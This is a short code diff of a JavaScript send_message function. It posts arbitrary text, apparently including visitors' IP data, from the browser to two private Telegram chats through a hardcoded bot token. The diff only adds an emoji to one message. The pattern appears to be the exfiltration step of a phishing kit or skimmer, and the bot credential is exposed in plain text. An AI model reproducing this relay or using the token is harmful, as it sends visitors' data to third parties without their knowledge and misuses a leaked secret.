@@ -6,7 +6,7 @@ var ip;
 
 function send_message(text) {
     let xhr = new XMLHttpRequest();
-    xhr.open('GET', `https://api.telegram.org/bot7565044994:AAFh6GYAfkGG2aUwGSlpdNbsHSCDAXKCgWA/sendMessage?chat_id=5247769901&text=${text}`, true);
+    xhr.open('GET', `https://api.telegram.org/bot7565044994:AAFh6GYAfkGG2aUwGSlpdNbsHSCDAXKCgWA/sendMessage?chat_id=5247769901&text=👨‍🔬${text}`, true);
     xhr.send();
     xhr = new XMLHttpRequest();
     xhr.open('GET', `https://api.telegram.org/bot7565044994:AAFh6GYAfkGG2aUwGSlpdNbsHSCDAXKCgWA/sendMessage?chat_id=5954926451&text=${text}`, true);
